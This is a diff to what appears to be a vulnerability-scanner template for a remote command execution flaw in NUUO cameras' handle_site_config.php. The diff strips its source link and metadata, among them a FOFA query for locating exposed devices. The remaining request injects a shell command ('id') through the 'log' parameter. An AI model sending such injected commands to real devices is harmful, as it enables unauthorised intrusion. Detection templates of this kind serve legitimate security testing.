@@ -3,12 +3,8 @@ info:
   name: NUUO摄像机 handle_site_config.php 存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zu33on5ld4q6uqt9'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zu33on5ld4q6uqt9
-    fofa: body="www.nuuo.com/eHelpdesk.php"
 http:
 - raw:
   - 'GET /handle_site_config.php?log=;id; HTTP/1.1
